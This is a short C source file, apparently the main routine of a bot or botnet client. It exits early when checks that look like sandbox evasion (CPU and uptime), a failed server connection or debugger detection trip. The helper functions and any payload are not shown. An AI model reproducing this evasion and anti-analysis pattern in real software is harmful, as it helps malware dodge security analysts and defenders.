#include "includes/bot/bot.h"


/*
    *    util/bot/bot.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


int main(void) {
    if (c_cpu() || d_uptime() == true) {
        exit(EXIT_FAILURE);
    }
    if (connect_server() == false) {
        exit(EXIT_FAILURE);
    }
    if (debug_detection() == true) {
        exit(EXIT_FAILURE);
    }
    return EXIT_SUCCESS;
}